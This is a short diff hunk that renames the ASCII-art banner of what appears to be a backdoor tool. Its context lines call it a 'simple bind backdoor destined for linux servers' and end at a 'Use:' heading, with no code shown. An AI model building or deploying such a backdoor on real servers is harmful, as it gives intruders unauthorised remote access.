@@ -3,7 +3,7 @@
            / \\ /\
       /\  /\/  \\V  \/\
      / \\/ // \\\\\ \\ \/\
-    //  / Mednc1c \/ \\
+    //  /   Medn1c    \/ \\
    
 Simple bind backdoor destined for linux servers
 Use:
